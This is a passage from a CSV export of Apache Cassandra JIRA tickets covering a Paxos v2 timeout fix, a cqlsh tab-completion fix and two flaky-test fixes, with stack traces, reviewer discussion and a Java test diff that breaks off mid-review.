|[trunk|https://github.com/apache/cassandra/pull/1985]|[j8 (/)|https://app.circleci.com/pipelines/github/jacek-lewandowski/cassandra/307/workflows/a00cd8c0-7a50-4b83-ba2e-cb99b0c8b319]|[j11 (/)|https://app.circleci.com/pipelines/github/jacek-lewandowski/cassandra/307/workflows/0a9922aa-53ea-4b05-91ba-148eec2a49a7]|
|[4.1|https://github.com/apache/cassandra/pull/1986]|[j8 (/)|https://app.circleci.com/pipelines/github/jacek-lewandowski/cassandra/306/workflows/fa3cd055-763a-4db6-9106-c1ae3691cd02]|[j11 (/)|https://app.circleci.com/pipelines/github/jacek-lewandowski/cassandra/306/workflows/2ec96e61-5593-4802-9ff1-33dd6a0bd562]|
|[4.0|https://github.com/apache/cassandra/pull/1987]|[j8 (/)|https://app.circleci.com/pipelines/github/jacek-lewandowski/cassandra/305/workflows/42ea925e-54cd-494e-957c-288fd8a45baa]|[j11 (/)|https://app.circleci.com/pipelines/github/jacek-lewandowski/cassandra/305/workflows/ec7d5189-43e0-4eee-bdb1-68088223fb43]|
|[3.11|https://github.com/apache/cassandra/pull/1968]|[j8 (/)|https://app.circleci.com/pipelines/github/jacek-lewandowski/cassandra/304/workflows/e9462c50-dac7-43ca-af0f-c089f76c5455]|-|

The failed tests where either present as flaky/failing on Butler or were rerun without failures.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Bug fix for WriteTimeoutException when using Paxos v2 in LWT performance test,CASSANDRA-17999,13492546,Bug,Resolved,CASSANDRA,Cassandra,software,mck,"<p>The Cassandra Project is a distributed storage system for managing structured/unstructured data while providing reliability at a massive scale.</p>
<br/>
<p>Please request the <b>creation of a jira account</b> on either the <a href=""https://cassandra.apache.org/_/community.html#discussions"">dev@cassandra.apache.org</a> mailing list or the ASF slack channel <a href=""https://cassandra.apache.org/_/community.html#discussions"">#cassandra-dev</a></p>",http://cassandra.apache.org/,Normal,Fixed,marianne-manaog,marianne-manaog,marianne-manaog,27/Oct/22 15:27,30/Jun/23 21:44,13/Jul/23 08:40,07/Nov/22 13:09,4.1-rc1,,,,,,Feature/Lightweight Transactions,,,,0,,"A WriteTimeoutException is encountered when using Paxos v2 in
an LWT performance test that only has a single datacenter because Paxos was still waiting for a response from another datacenter during the Commit/Acknowledge phase even though we were running with LOCAL_SERIAL.",,benedict,blambov,dcapwell,maedhroz,marianne-manaog,,,,,,,,,,"marianne-manaog opened a new pull request, #205:
URL: https://github.com/apache/cassandra-dtest/pull/205

   Recreated a WriteTimeoutException which is encountered when using Paxos v2 in an LWT performance test that only has a single datacenter because Paxos was still waiting for a response from another datacenter during the Commit/Acknowledge phase even though we were running with LOCAL_SERIAL.
   
   patch by @marianne-manaog ; reviewed by @blambov  for CASSANDRA-17999
   
   The [Cassandra Jira](https://issues.apache.org/jira/browse/CASSANDRA-17999)


;28/Oct/22 09:15;githubbot;600","marianne-manaog opened a new pull request, #1958:
URL: https://github.com/apache/cassandra/pull/1958

   A bug fix for WriteTimeoutException when using Paxos v2 in an LWT performance test that only has a single datacenter due to Paxos still waiting for a response from another datacenter during the Commit/Acknowledge phase even though we are running with LOCAL_SERIAL.
   
   patch by @marianne-manaog ; reviewed by @blambov for [CASSANDRA-17999](https://issues.apache.org/jira/browse/CASSANDRA-17999)
   
   The [Cassandra Jira](https://issues.apache.org/jira/browse/CASSANDRA-17999)
   
   


;28/Oct/22 09:24;githubbot;600","marianne-manaog opened a new pull request, #1961:
URL: https://github.com/apache/cassandra/pull/1961

   Recreated a WriteTimeoutException which is encountered when using Paxos v2 in an LWT performance test that only has a single datacenter because Paxos was still waiting for a response from another datacenter during the Commit/Acknowledge phase even though we were running with LOCAL_SERIAL.
   
   patch by @marianne-manaog; reviewed by @blambov for [CASSANDRA-17999](https://issues.apache.org/jira/browse/CASSANDRA-17999)
   
   The [Cassandra Jira](https://issues.apache.org/jira/browse/CASSANDRA-17999)


;30/Oct/22 18:24;githubbot;600","marianne-manaog opened a new pull request, #1966:
URL: https://github.com/apache/cassandra/pull/1966

   Recreated a WriteTimeoutException which is encountered when using Paxos v2 in an LWT performance test that only has a single datacenter because Paxos was still waiting for a response from another datacenter during the Commit/Acknowledge phase even though we were running with LOCAL_SERIAL.
   
   patch by @marianne-manaog; reviewed by @blambov for [CASSANDRA-17999](https://issues.apache.org/jira/browse/CASSANDRA-17999)
   
   The [Cassandra Jira](https://issues.apache.org/jira/browse/CASSANDRA-17999)


;03/Nov/22 12:08;githubbot;600","marianne-manaog opened a new pull request, #1967:
URL: https://github.com/apache/cassandra/pull/1967

   A bug fix for WriteTimeoutException when using Paxos v2 in an LWT performance test that only has a single datacenter due to Paxos still waiting for a response from another datacenter during the Commit/Acknowledge phase even though we are running with LOCAL_SERIAL.
   
   patch by @marianne-manaog ; reviewed by @blambov for [CASSANDRA-17999](https://issues.apache.org/jira/browse/CASSANDRA-17999)
   
   The [Cassandra Jira](https://issues.apache.org/jira/browse/CASSANDRA-17999)


;03/Nov/22 12:09;githubbot;600","marianne-manaog commented on PR #205:
URL: https://github.com/apache/cassandra-dtest/pull/205#issuecomment-1305367953

   Closing this PR as per [this comment on Jira](https://issues.apache.org/jira/browse/CASSANDRA-17999?focusedCommentId=17629720&page=com.atlassian.jira.plugin.system.issuetabpanels:comment-tabpanel#comment-17629720) from Branimir Lambov, mentioning that this Python dtest is no longer required.


;07/Nov/22 10:02;githubbot;600","marianne-manaog closed pull request #205: CASSANDRA-17999: Recreate WriteTimeoutException when using Paxos v2 in LWT performance test
URL: https://github.com/apache/cassandra-dtest/pull/205


;07/Nov/22 10:02;githubbot;600","marianne-manaog commented on PR #1967:
URL: https://github.com/apache/cassandra/pull/1967#issuecomment-1305371968

   Closing this PR as per [this comment on Jira](https://issues.apache.org/jira/browse/CASSANDRA-17999?focusedCommentId=17629720&page=com.atlassian.jira.plugin.system.issuetabpanels:comment-tabpanel#comment-17629720) from Branimir Lambov, and I will raise a new PR with both the bug fix and the in-jvm dtest.


;07/Nov/22 10:05;githubbot;600","marianne-manaog closed pull request #1967: CASSANDRA-17999: Bug fix for WriteTimeoutException when using Paxos v2 in LWT performance test
URL: https://github.com/apache/cassandra/pull/1967


;07/Nov/22 10:05;githubbot;600","marianne-manaog commented on PR #1966:
URL: https://github.com/apache/cassandra/pull/1966#issuecomment-1305372232

   Closing this PR as per [this comment on Jira](https://issues.apache.org/jira/browse/CASSANDRA-17999?focusedCommentId=17629720&page=com.atlassian.jira.plugin.system.issuetabpanels:comment-tabpanel#comment-17629720) from Branimir Lambov, and I will raise a new PR with both the bug fix and the in-jvm dtest.


;07/Nov/22 10:05;githubbot;600","marianne-manaog closed pull request #1966: CASSANDRA-17999: Recreate WriteTimeoutException when using Paxos v2 in LWT performance test
URL: https://github.com/apache/cassandra/pull/1966


;07/Nov/22 10:05;githubbot;600","marianne-manaog closed pull request #1958: CASSANDRA-17999: Bug fix for WriteTimeoutException when using Paxos v2 in LWT performance test
URL: https://github.com/apache/cassandra/pull/1958


;07/Nov/22 10:17;githubbot;600","marianne-manaog closed pull request #1961: CASSANDRA-17999: Recreate WriteTimeoutException when using Paxos v2 in LWT performance test
URL: https://github.com/apache/cassandra/pull/1961


;07/Nov/22 10:17;githubbot;600","marianne-manaog opened a new pull request, #1979:
URL: https://github.com/apache/cassandra/pull/1979

   A bug fix and a related in-jvm dtest for WriteTimeoutException when using Paxos v2 in an LWT performance test that only has a single datacenter due to Paxos still waiting for a response from another datacenter during the Commit/Acknowledge phase even though we are running with LOCAL_SERIAL.
   
   patch by @marianne-manaog ; reviewed by @blambov for [CASSANDRA-17999](https://issues.apache.org/jira/browse/CASSANDRA-17999)
   
   The [Cassandra Jira](https://issues.apache.org/jira/browse/CASSANDRA-17999)


;07/Nov/22 10:27;githubbot;600","marianne-manaog opened a new pull request, #1980:
URL: https://github.com/apache/cassandra/pull/1980

   A bug fix and a related in-jvm dtest for WriteTimeoutException when using Paxos v2 in an LWT performance test that only has a single datacenter due to Paxos still waiting for a response from another datacenter during the Commit/Acknowledge phase even though we are running with LOCAL_SERIAL.
   
   patch by @marianne-manaog ; reviewed by @blambov for [CASSANDRA-17999](https://issues.apache.org/jira/browse/CASSANDRA-17999)
   
   The [Cassandra Jira](https://issues.apache.org/jira/browse/CASSANDRA-17999)


;07/Nov/22 10:34;githubbot;600","marianne-manaog closed pull request #1979: CASSANDRA-17999: Fix bug in CASTest.java to avoid 'WriteTimeoutException' for local tests
URL: https://github.com/apache/cassandra/pull/1979


;30/Jun/23 21:44;githubbot;600","marianne-manaog closed pull request #1980: CASSANDRA-17999: Fix bug in CASTest.java to avoid 'WriteTimeoutException' for local tests
URL: https://github.com/apache/cassandra/pull/1980


;30/Jun/23 21:44;githubbot;600",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0,10200,,,0,10200,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,marianne-manaog,,,,,,,,,,,,,,Availability -> Unavailable,,,,,,,,Low Hanging Fruit,Performance Regression Test,,false,,,,,,,,,,,,,,,,,9223372036854775807,,None,,Mon Nov 07 13:31:39 UTC 2022,,,mfleming,,,,All,,,,"0|z1afps:",9223372036854775807,,,,benedict,blambov,,,Critical,,4.1-beta1,,https://github.com/apache/cassandra/pull/1980 (against 4.1) and https://github.com/apache/cassandra/pull/1979 (against trunk),,,,,,,,,Added problem reproduction as dtest.,,,,,"28/Oct/22 11:19;blambov;[~benedict] , could you take a quick look at this? It's a one-line fix which looks good to me, but wondering if there's something we are missing.;;;","28/Oct/22 11:22;benedict;Fix looks good, but is there a reason we're not using in-jvm dtests to introduce a regression test for this?

Also wanted to say good catch. I've wanted for a while to expand the simulator to monitor availability, though it's a more difficult problem than testing that the isolation levels are maintained.;;;","30/Oct/22 18:31;marianne-manaog;Hi [~benedict], thank you for your comment and suggestion to use in-jvm dtest. As requested, please note I submitted a relevant PR as per [this link|https://github.com/apache/cassandra/pull/1961]. If you have any further questions and/or concerns, please let me know.

 

cc'ing: [~blambov], [~mfleming] ;;;","31/Oct/22 17:27;dcapwell;since Paxos v2 is 4.1, should this go into 4.1.0?;;;","03/Nov/22 12:14;marianne-manaog;Hi [~dcapwell], please note I have added a new PR for Cassandra 4.1.0 as per these links: [dtest|https://github.com/apache/cassandra/pull/1966] and [bug fix|https://github.com/apache/cassandra/pull/1967];;;","07/Nov/22 09:44;blambov;This new PR is against 4.1, but it brings all the differences between trunk and 4.1. Checkout cassandra-4.1 into a new branch, cherry-pick the patch and then push the branch and create a pull request to 4.1 from it.

Also, the in-jvm dtest, unlike the python dtest that lives in a separate repository, needs to be included in the main PR so that we can run CI tests. As the python dtest PR is no longer necessary, we can cancel and close that one too. That is, we should have one PR against 4.1 and one against trunk that include both the in-jvm dtest and bug fix (and only these changes).;;;","07/Nov/22 10:36;marianne-manaog;Hi [~blambov], sorry for the inconvenience and thank you for your comment, following which I closed the [Python dtest PR|https://github.com/apache/cassandra-dtest/pull/205] and raised the following two new PRs that include both the bug fix and the in-jvm dtest against:
 * [4.1|https://github.com/apache/cassandra/pull/1980]
 * [trunk|https://github.com/apache/cassandra/pull/1979]

If you have any further questions/concerns, please let me know.;;;","07/Nov/22 11:55;blambov;Tests started here: [trunk|https://app.circleci.com/pipelines/github/blambov/cassandra/273/workflows/fb999a79-dd3d-4b70-843f-e88b3715ee6d] [4.1|https://app.circleci.com/pipelines/github/blambov/cassandra/274/workflows/e26229be-0c9a-40f7-9066-7a23e341f49f];;;","07/Nov/22 12:57;blambov;Okay, trunk tests are green and the 4.1 ones had 2 flakes on other tests in the repeated {{CASTest}} which I believe are not caused by this. I'm moving forward to committing the patch.;;;","07/Nov/22 13:09;blambov;Committed as [acda6fad688e95e0a9a34de28e3b61a775e59736|https://github.com/apache/cassandra/commit/acda6fad688e95e0a9a34de28e3b61a775e59736] (4.1) and [f236f40fc526dd75db648f4c6cc34d7f33fbd8f3|https://github.com/apache/cassandra/commit/f236f40fc526dd75db648f4c6cc34d7f33fbd8f3] (trunk).;;;","07/Nov/22 13:31;marianne-manaog;Thank you for your update, [~blambov]. That is great news! And also thanks to [~mfleming] for your guidance and support throughout the process.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Add memtable option among possible tab completions for a table ,CASSANDRA-17982,13488656,Bug,Resolved,CASSANDRA,Cassandra,software,mck,"<p>The Cassandra Project is a distributed storage system for managing structured/unstructured data while providing reliability at a massive scale.</p>
<br/>
<p>Please request the <b>creation of a jira account</b> on either the <a href=""https://cassandra.apache.org/_/community.html#discussions"">dev@cassandra.apache.org</a> mailing list or the ASF slack channel <a href=""https://cassandra.apache.org/_/community.html#discussions"">#cassandra-dev</a></p>",http://cassandra.apache.org/,Normal,Fixed,smiklosovic,smiklosovic,smiklosovic,21/Oct/22 14:01,22/Oct/22 11:12,13/Jul/23 08:40,21/Oct/22 20:57,5.0,,,,,,CQL/Interpreter,,,,0,,"""memtable"" option is missing on hitting <TAB> when creating a table",,smiklosovic,,,,,,,,,,,,,,"smiklosovic closed pull request #1942: CASSANDRA-17982
URL: https://github.com/apache/cassandra/pull/1942


;22/Oct/22 11:12;githubbot;600",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0,600,,,0,600,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,smiklosovic,,,,,,,,,,,,,,Code,,,,,,,,Low Hanging Fruit,Adhoc Test,,false,,,,,,,,,,,,,,,,,9223372036854775807,,None,,Fri Oct 21 20:32:34 UTC 2022,,,,,,,All,,,,"0|z19rrc:",9223372036854775807,,,,brandon.williams,smiklosovic,,,Low,,NA,,https://github.com/apache/cassandra/commit/c71f04bd5b19994e2f2c52a67f2ea1d139fcbfd3,,,,,,,,,updated tests passing,,,,,"21/Oct/22 14:11;smiklosovic;https://github.com/apache/cassandra/pull/1942/files;;;","21/Oct/22 14:12;smiklosovic;[~blambov] would you mind to take a look? I am building it as we speak.;;;","21/Oct/22 14:21;brandon.williams;LGTM, +1 if CI looks okay.;;;","21/Oct/22 20:32;smiklosovic;j11 https://app.circleci.com/pipelines/github/instaclustr/cassandra/1479/workflows/1d105d2e-b884-44b1-856e-7c79d7df23e1
j8 https://app.circleci.com/pipelines/github/instaclustr/cassandra/1479/workflows/7e213e11-365d-4948-8dad-9d6851ba3fee;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Fix flaky Python DTest materialized_views_test.TestMaterializedViews.test_resume_stopped_build,CASSANDRA-17980,13487317,Bug,Resolved,CASSANDRA,Cassandra,software,mck,"<p>The Cassandra Project is a distributed storage system for managing structured/unstructured data while providing reliability at a massive scale.</p>
<br/>
<p>Please request the <b>creation of a jira account</b> on either the <a href=""https://cassandra.apache.org/_/community.html#discussions"">dev@cassandra.apache.org</a> mailing list or the ASF slack channel <a href=""https://cassandra.apache.org/_/community.html#discussions"">#cassandra-dev</a></p>",http://cassandra.apache.org/,Normal,Fixed,brandon.williams,e.dimitrova,e.dimitrova,20/Oct/22 18:28,28/Mar/23 11:21,13/Jul/23 08:40,28/Mar/23 11:21,4.0.9,4.1.2,5.0,,,,CI,,,,0,,"[This run|https://app.circleci.com/pipelines/github/ekaterinadimitrova2/cassandra?branch=test-resume-stopped-build] shows Python DTest materialized_views_test.TestMaterializedViews.test_resume_stopped_build is flaky on current 4.0 (other branches to be verified)

 
{code:java}
test teardown failure Unexpected error found in node logs (see stdout for full details). Errors: [[node2] 'ERROR [OptionalTasks:1] 2022-10-20 15:47:34,947 CassandraDaemon.java:581 - Exception in thread Thread[OptionalTasks:1,5,main]\njava.lang.RuntimeException: java.util.concurrent.ExecutionException: org.apache.cassandra.db.view.ViewBuilderTask$StoppedException: Compaction interrupted: View build(82580ca3-508e-11ed-b50c-8bdefae2f6eb, 119 / 1000 token range parts)@789d3460-508e-11ed-b50c-8bdefae2f6eb(ks, t)\n\tat org.apache.cassandra.utils.FBUtilities.waitOnFuture(FBUtilities.java:488)\n\tat org.apache.cassandra.db.view.ViewBuilder.stop(ViewBuilder.java:236)\n\tat org.apache.cassandra.db.view.View.stopBuild(View.java:224)\n\tat org.apache.cassandra.db.view.View.build(View.java:211)\n\tat org.apache.cassandra.db.view.ViewManager.buildAllViews(ViewManager.java:180)\n\tat org.apache.cassandra.service.CassandraDaemon.lambda$setup$2(CassandraDaemon.java:433)\n\tat java.base/java.util.concurrent.Executors$RunnableAdapter.call(Executors.java:515)\n\tat java.base/java.util.concurrent.FutureTask.run(FutureTask.java:264)\n\tat java.base/java.util.concurrent.ScheduledThreadPoolExecutor$ScheduledFutureTask.run(ScheduledThreadPoolExecutor.java:304)\n\tat java.base/java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1128)\n\tat java.base/java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:628)\n\tat io.netty.util.concurrent.FastThreadLocalRunnable.run(FastThreadLocalRunnable.java:30)\n\tat java.base/java.lang.Thread.run(Thread.java:829)\nCaused by: java.util.concurrent.ExecutionException: org.apache.cassandra.db.view.ViewBuilderTask$StoppedException: Compaction interrupted: View build(82580ca3-508e-11ed-b50c-8bdefae2f6eb, 119 / 1000 token range parts)@789d3460-508e-11ed-b50c-8bdefae2f6eb(ks, t)\n\tat com.google.common.util.concurrent.AbstractFuture.getDoneValue(AbstractFuture.java:552)\n\tat com.google.common.util.concurrent.AbstractFuture.get(AbstractFuture.java:533)\n\tat com.google.common.util.concurrent.AbstractFuture$TrustedFuture.get(AbstractFuture.java:90)\n\tat org.apache.cassandra.utils.FBUtilities.waitOnFuture(FBUtilities.java:484)\n\t... 12 common frames omitted\nCaused by: org.apache.cassandra.db.view.ViewBuilderTask$StoppedException: Compaction interrupted: View build(82580ca3-508e-11ed-b50c-8bdefae2f6eb, 119 / 1000 token range parts)@789d3460-508e-11ed-b50c-8bdefae2f6eb(ks, t)\n\tat org.apache.cassandra.db.view.ViewBuilderTask.finish(ViewBuilderTask.java:194)\n\tat org.apache.cassandra.db.view.ViewBuilderTask.call(ViewBuilderTask.java:171)\n\tat org.apache.cassandra.db.compaction.CompactionManager.lambda$submitViewBuilder$6(CompactionManager.java:1802)\n\tat java.base/java.util.concurrent.FutureTask.run(FutureTask.java:264)\n\tat org.apache.cassandra.concurrent.DebuggableThreadPoolExecutor$FutureLocalSessionWrapper.lambda$new$0(DebuggableThreadPoolExecutor.java:408)\n\tat java.base/java.util.concurrent.FutureTask.run(FutureTask.java:264)\n\t... 4 common frames omitted']{code}",,e.dimitrova,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,CASSANDRA-17873,,,,,,,,,,,,0.0,brandon.williams,,,,,,,,,,,,,,Correctness -> Test Failure,,,,,,,,Normal,User Report,,false,,,,,,,,,,,,,,,,,9223372036854775807,,None,,Tue Mar 28 11:21:09 UTC 2023,,,,,,,All,,,,"0|z19jhs:",9223372036854775807,,,,e.dimitrova,,,,Normal,,NA,,https://github.com/apache/cassandra-dtest/commit/0d8890ae4fb16e3327de14853570b3c26993e7f2,,,,,,,,,run CI,,,,,"20/Oct/22 19:57;brandon.williams;Since we are stopping the view build, we need to [allow the error from doing so|https://github.com/driftx/cassandra-dtest/commit/1b634d2421847b992af23254cb464d5e7d592c47].  This doesn't repro in 500x [with the patch|https://app.circleci.com/pipelines/github/driftx/cassandra/675/workflows/79ba9d59-8b99-4608-bd1a-f3821d6fd0e5/jobs/7496], but it also doesn't repro [without it|https://app.circleci.com/pipelines/github/driftx/cassandra/674/workflows/75ee1dee-c2fe-4c59-9c0e-7e5c55889ee1/jobs/7494] but we can always reopen later.;;;","20/Oct/22 20:20;e.dimitrova;+1, I had similar thoughts when opening the ticket but you grabbed it/fixed it very quickly :) Thanks!;;;","20/Oct/22 20:21;e.dimitrova;Ops, which branch you tested with? 4.0? This is where we reproduced. Also, can we try also the other branches in a loop? Sorry missed that with my previous comment. Was too excited to get rid of one more flaky test :D;;;","20/Oct/22 20:35;brandon.williams;Yep, those were against 4.0.  I've started [4.1|https://app.circleci.com/pipelines/github/driftx/cassandra/677/workflows/f0f012e1-cebd-462e-b35f-fe3ff94df5dc] and [trunk|https://app.circleci.com/pipelines/github/driftx/cassandra/676/workflows/d0d88d5a-99db-4c49-84fb-ac48ed9f9da2].;;;","24/Mar/23 13:57;brandon.williams;Low-energy ping, I think this fell off our radar.;;;","24/Mar/23 14:13;e.dimitrova;Thanks for the ping, let's rebase and ship it if nothing new pops up? 
+1 on green CI
Apologize I missed the update earlier :( ;;;","24/Mar/23 14:24;brandon.williams;Rebased:

||Branch||CI||
|[4.0|https://github.com/driftx/cassandra/tree/CASSANDRA-17980-4.0]|[j8|https://app.circleci.com/pipelines/github/driftx/cassandra/928/workflows/f4e93a72-d4aa-47a2-996f-aa3fb018d848], [j11|https://app.circleci.com/pipelines/github/driftx/cassandra/928/workflows/a9c7eb72-35e4-4037-9828-8197749591a5]|
|[4.1|https://github.com/driftx/cassandra/tree/CASSANDRA-17980-4.1]|[j8|https://app.circleci.com/pipelines/github/driftx/cassandra/929/workflows/50a35486-0384-4804-8b8b-dc05de2c4b0b], [j11|https://app.circleci.com/pipelines/github/driftx/cassandra/929/workflows/228ff3c8-7f8a-466a-8bc5-6df6acb3f543]|
|[trunk|https://github.com/driftx/cassandra/tree/CASSANDRA-17980-trunk]|[j8|https://app.circleci.com/pipelines/github/driftx/cassandra/930/workflows/740e1711-8250-445e-807c-775a44ad3fde], [j11|https://app.circleci.com/pipelines/github/driftx/cassandra/930/workflows/332a3a8b-388e-4ba3-ace7-d79dae1fa889]|

bq. Apologize I missed the update earlier

No problem, it happens! I forgot all about this too.;;;","24/Mar/23 15:52;e.dimitrova;Thanks, considering this is a change in the dtest repo, shall we run in a loop the Python test? Unfortunately, the multiplexer does not detect Python DTest changes;;;","24/Mar/23 15:54;brandon.williams;I decided not to since the first time we did that, there were no worthwhile results.  It didn't fail in either run.;;;","24/Mar/23 17:22;e.dimitrova;SGTM, as long as there were no recent changes around that test in the DTest repo it makes sense to me
The runs published also seem ok from the perspective of this patch. We need to check for tickets for the few failures, I do not remember seeing those;;;","24/Mar/23 19:55;brandon.williams;On 4.0, the same test timed out on both jvms which is [legit|https://issues.apache.org/jira/browse/CASSANDRA-18366].  The 4.1 timeout is environmental and trunk is clean.;;;","24/Mar/23 20:11;e.dimitrova;Tanks for opening the ticket, I linked it in Butler which shows it consistently started failing on 4.0 with CASSANDRA-18294;;;","27/Mar/23 21:36;brandon.williams;Are we ready to commit here?;;;","27/Mar/23 22:07;e.dimitrova;CI looks good so my +1 stands, thank you! ;;;","28/Mar/23 11:21;brandon.williams;Committed.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Fix flaky test:org.apache.cassandra.net.HandshakeTest.testOutboundConnectionfFallbackDuringUpgrades,CASSANDRA-17979,13487245,Bug,Resolved,CASSANDRA,Cassandra,software,mck,"<p>The Cassandra Project is a distributed storage system for managing structured/unstructured data while providing reliability at a massive scale.</p>
<br/>
<p>Please request the <b>creation of a jira account</b> on either the <a href=""https://cassandra.apache.org/_/community.html#discussions"">dev@cassandra.apache.org</a> mailing list or the ASF slack channel <a href=""https://cassandra.apache.org/_/community.html#discussions"">#cassandra-dev</a></p>",http://cassandra.apache.org/,Normal,Fixed,dchenbecker,brandon.williams,brandon.williams,20/Oct/22 10:49,22/Feb/23 18:29,13/Jul/23 08:40,14/Feb/23 22:07,5.0,,,,,,Messaging/Internode,,,,0,,"https://ci-cassandra.apache.org/job/Cassandra-trunk/1339/testReport/org.apache.cassandra.net/HandshakeTest/testOutboundConnectionfFallbackDuringUpgrades_cdc/

https://ci-cassandra.apache.org/job/Cassandra-trunk/1336/testReport/org.apache.cassandra.net/HandshakeTest/testOutboundConnectionfFallbackDuringUpgrades_compression/

https://app.circleci.com/pipelines/github/instaclustr/cassandra/1466/workflows/ffb52616-92d7-4089-a0c9-a9ebf28333c0/jobs/6296/tests

{noformat}
junit.framework.AssertionFailedError
	at org.apache.cassandra.net.HandshakeTest.testOutboundFallbackOnSSLHandshakeFailure(HandshakeTest.java:384)
	at org.apache.cassandra.net.HandshakeTest.testOutboundConnectionfFallbackDuringUpgrades(HandshakeTest.java:243)
	at java.base/jdk.internal.reflect.NativeMethodAccessorImpl.invoke0(Native Method)
	at java.base/jdk.internal.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:62)
	at java.base/jdk.internal.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43)
{noformat}",,dchenbecker,e.dimitrova,smiklosovic,,,,,,,,,,,,"dchenbecker opened a new pull request, #2143:
URL: https://github.com/apache/cassandra/pull/2143

   The call to hasPending is not dependent on the isConnected call, and the test is to ensure that handshake (e.g. connection) works, not that messages are flushed. If we want to make some assertions on message delivery, they should be in a different test and will need different logic.
   
   Fixes CASSANDRA-17979
   
   patch by Derek Chen-Becker; reviewed by TBD for CASSANDRA-17979
   


;06/Feb/23 17:00;githubbot;600","jyothsnakonisa commented on code in PR #2143:
URL: https://github.com/apache/cassandra/pull/2143#discussion_r1101909473


##########
test/unit/org/apache/cassandra/net/HandshakeTest.java:
##########
@@ -377,24 +378,35 @@ private void testOutboundFallbackOnSSLHandshakeFailure(SslFallbackConnectionType
             InetAddressAndPort endpoint = inbound.sockets().stream().map(s -> s.settings.bindAddress).findFirst().get();
             inbound.open();
 
-            // Open outbound connections, and wait until connection is established
+            // Open outbound connections, and wait until connection is established and the initial message is delivered
             OutboundConnection outboundConnection = initiateOutbound(endpoint, fromConnectionType, fromOptional);
-            waitForConnection(outboundConnection);
-            assertTrue(outboundConnection.isConnected());
-            assertFalse(outboundConnection.hasPending());
+            confirmDelivery(outboundConnection);
         }
         finally
         {
             inbound.close().await(10L, TimeUnit.SECONDS);
         }
     }
 
-    private void waitForConnection(OutboundConnection outboundConnection) throws InterruptedException
+    private final static Duration DELIVERY_WAIT_DURATION = Duration.ofSeconds(60);
+
+    private void confirmDelivery(OutboundConnection outboundConnection) throws InterruptedException
     {
-        long startTime = System.currentTimeMillis();
-        while (!outboundConnection.isConnected() && System.currentTimeMillis() - startTime < 60000)
+        Instant endTime = Instant.now().plus(DELIVERY_WAIT_DURATION);
+
+        while (!outboundConnection.isConnected() && Instant.now().isBefore(endTime))
         {
             Thread.sleep(1000);
         }
+
+        // Now that we're connected, we also want to ensure that the delivery thread succeeded
+        while (outboundConnection.hasPending() && Instant.now().isBefore(endTime)) {

Review Comment:
   I think we just want to verify that the connection is established and we don't have to wait for pending connections to be flushed. We might be waiting indefinitely for the pending connections to be flushed and the test might fail.



;09/Feb/23 19:07;githubbot;600","jyothsnakonisa commented on code in PR #2143:
URL: https://github.com/apache/cassandra/pull/2143#discussion_r1101909473


##########
test/unit/org/apache/cassandra/net/HandshakeTest.java:
##########
@@ -377,24 +378,35 @@ private void testOutboundFallbackOnSSLHandshakeFailure(SslFallbackConnectionType
             InetAddressAndPort endpoint = inbound.sockets().stream().map(s -> s.settings.bindAddress).findFirst().get();
             inbound.open();
 
-            // Open outbound connections, and wait until connection is established
+            // Open outbound connections, and wait until connection is established and the initial message is delivered
             OutboundConnection outboundConnection = initiateOutbound(endpoint, fromConnectionType, fromOptional);
-            waitForConnection(outboundConnection);
-            assertTrue(outboundConnection.isConnected());
-            assertFalse(outboundConnection.hasPending());
+            confirmDelivery(outboundConnection);
         }
         finally
         {
             inbound.close().await(10L, TimeUnit.SECONDS);
         }
     }
 
-    private void waitForConnection(OutboundConnection outboundConnection) throws InterruptedException
+    private final static Duration DELIVERY_WAIT_DURATION = Duration.ofSeconds(60);
+
+    private void confirmDelivery(OutboundConnection outboundConnection) throws InterruptedException
     {
-        long startTime = System.currentTimeMillis();
-        while (!outboundConnection.isConnected() && System.currentTimeMillis() - startTime < 60000)
+        Instant endTime = Instant.now().plus(DELIVERY_WAIT_DURATION);
+
+        while (!outboundConnection.isConnected() && Instant.now().isBefore(endTime))
         {
             Thread.sleep(1000);
         }
+
+        // Now that we're connected, we also want to ensure that the delivery thread succeeded
+        while (outboundConnection.hasPending() && Instant.now().isBefore(endTime)) {

Review Comment:
   I think we just want to verify that the connection is established and we don't have to wait for pending connections to be flushed. We might be waiting indefinitely for the pending connections to be flushed and the test might fail because of timeout.



;09/Feb/23 19:09;githubbot;600","dchenbecker commented on code in PR #2143:
URL: https://github.com/apache/cassandra/pull/2143#discussion_r1102005705


##########
test/unit/org/apache/cassandra/net/HandshakeTest.java:
##########
@@ -377,24 +378,35 @@ private void testOutboundFallbackOnSSLHandshakeFailure(SslFallbackConnectionType
             InetAddressAndPort endpoint = inbound.sockets().stream().map(s -> s.settings.bindAddress).findFirst().get();
             inbound.open();
 
-            // Open outbound connections, and wait until connection is established
+            // Open outbound connections, and wait until connection is established and the initial message is delivered
             OutboundConnection outboundConnection = initiateOutbound(endpoint, fromConnectionType, fromOptional);
-            waitForConnection(outboundConnection);
-            assertTrue(outboundConnection.isConnected());
-            assertFalse(outboundConnection.hasPending());
+            confirmDelivery(outboundConnection);
         }
         finally
         {
             inbound.close().await(10L, TimeUnit.SECONDS);
         }
     }
